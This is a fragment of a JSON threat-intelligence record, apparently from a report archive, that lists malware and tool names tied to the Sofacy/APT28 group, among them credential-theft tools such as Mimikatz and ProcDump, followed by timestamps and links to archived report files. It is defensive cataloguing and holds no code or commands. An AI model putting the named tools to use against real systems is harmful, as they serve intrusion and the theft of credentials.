                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1487689997,
    "ts_modification_date": 1487690004,
    "files": {
        "pdf": "https://archive.orkl.eu/d206b485a42c611ed9fe6a0b1a3ed086e954bd30.pdf",
        "text": "https://archive.orkl.eu/d206b485a42c611ed9fe6a0b1a3ed086e954bd30.txt",
        "img": "https://archive.orkl.eu/d206b485a42c611ed9fe6a0b1a3ed086e954bd30.jpg"
    }
}